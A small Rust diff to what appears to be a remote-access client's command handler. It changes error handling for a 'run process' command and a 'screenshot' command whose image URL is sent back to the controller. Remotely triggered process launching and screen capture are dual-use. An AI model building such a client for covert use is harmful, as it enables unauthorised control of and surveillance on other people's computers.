@@ -160,7 +160,7 @@ impl Client {
                     if args.clone().is_empty() {
                         self.send("Missing argument")?;
                     } else {
-                        Utils::run_process(args[0], args[1], false);
+                        Utils::run_process(args[0], vec![args[1]], false)?;
                         self.send("Done")?;
                     }
                 }
@@ -185,7 +185,7 @@ impl Client {
                 }
 
                 "screenshot" => {
-                    let url = Utils::screenshot_url().await;
+                    let url = Utils::screenshot_url().await?;
 
                     self.send(&url)?;
                 }
